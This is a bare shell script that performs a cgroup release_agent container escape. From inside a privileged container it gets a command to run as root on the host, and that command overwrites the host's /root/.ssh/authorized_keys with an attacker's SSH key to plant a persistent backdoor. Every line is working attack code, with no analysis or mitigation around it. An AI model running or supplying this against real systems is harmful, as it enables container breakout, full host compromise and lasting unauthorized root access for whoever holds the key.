mkdir /tmp/dedsec && mount -t cgroup -o rdma cgroup /tmp/dedsec && mkdir /tmp/dedsec/x
echo 1 > /tmp/dedsec/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/dedsec/release_agent

echo '#!/bin/sh' > /cmd
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDArX' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/dedsec/x/cgroup.procs"
